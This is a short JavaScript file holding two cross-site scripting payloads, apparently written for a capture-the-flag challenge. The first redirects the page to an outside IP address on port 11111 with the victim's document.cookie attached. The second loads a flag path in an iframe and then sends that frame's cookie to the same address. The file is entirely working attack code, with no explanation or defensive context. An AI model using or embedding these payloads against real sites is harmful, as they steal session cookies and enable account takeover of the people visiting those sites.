// 1
document.location='http://159.65.16.57:11111/?data='+document.cookie;
// 2
var frame = document.createElement('iframe');
frame.src = '/QWB_fl4g/QWB/';
frame.id = 'f';

frame.onload = function () {
  document.location = 'http://159.65.16.57:11111/?data='+document.getElementById('f').contentWindow.document.cookie;
};
document.body.appendChild(frame);